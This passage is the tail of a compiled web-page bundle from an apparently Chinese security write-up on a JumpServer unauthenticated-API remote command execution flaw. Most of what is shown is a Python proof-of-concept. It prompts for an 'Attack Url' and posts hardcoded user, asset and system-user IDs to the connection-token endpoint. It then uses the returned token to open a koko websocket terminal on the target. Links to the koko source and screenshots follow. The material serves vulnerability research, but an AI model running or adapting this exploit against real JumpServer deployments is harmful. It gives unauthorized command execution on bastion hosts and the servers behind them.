                    ws<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息\\033[0m&quot;</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息,{}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">POC_2</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> asset<span class="token punctuation">,</span> system_user<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> target_url <span class="token operator">==</span> <span class="token string">&quot;&quot;</span> <span class="token keyword">or</span> asset <span class="token operator">==</span> <span class="token string">&quot;&quot;</span> <span class="token keyword">or</span> system_user <span class="token operator">==</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请获取 assset 等参数配置\\033[0m&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span> <span class="token string">&quot;asset&quot;</span><span class="token punctuation">:</span> asset<span class="token punctuation">,</span> <span class="token string">&quot;system_user&quot;</span><span class="token punctuation">:</span> system_user<span class="token punctuation">}</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/api/v1/users/connection-token/?user-only=1&quot;</span>
    <span class="token comment"># vuln_url = target_url + &quot;/api/v1/authentication/connection-token/?user-only=1&quot;</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>vuln_url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 正在请求：{}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>vuln_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        token <span class="token operator">=</span> response<span class="token punctuation">[</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[36m[o] 成功获取Token：{}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span>
        ws_url <span class="token operator">=</span> target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">&quot;http://&quot;</span><span class="token punctuation">)</span>
        ws_url <span class="token operator">=</span> <span class="token string">&quot;ws://&quot;</span> <span class="token operator">+</span> ws_url <span class="token operator">+</span> <span class="token string">&quot;/koko/ws/token/?target_id={}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
        asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>main_logic<span class="token punctuation">(</span>ws_url<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请检查 assset 等参数配置,{}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl   &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    user <span class="token operator">=</span> <span class="token string">&quot;ed3460eb-3c70-4beb-b631-f8f91c39bdd1&quot;</span>
    asset <span class="token operator">=</span> <span class="token string">&quot;37fce0b0-cc4f-4822-8c33-afdebc888fa7&quot;</span>
    system_user <span class="token operator">=</span> <span class="token string">&quot;da09ddd7-fd3f-46c3-914d-752883a4d950&quot;</span>
    POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    POC_2<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> asset<span class="token punctuation">,</span> system_user<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101945982.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101946161.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13);function g(f,w){const t=o("ExternalLinkIcon");return c(),i("div",null,[u,n("p",null,[n("a",r,[s("下载链接"),p(t)])]),k,n("p",null,[s("等待安装完毕访问 "),n("a",d,[s("http://xxx.xxx.xxx.xxxx:8080"),p(t)])]),v,n("p",null,[s("后端代码 "),n("a",m,[s("https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go"),p(t)])]),b])}const h=e(l,[["render",g],["__file","JumpServer 未授权接口 远程命令执行漏洞.html.vue"]]);export{h as default};
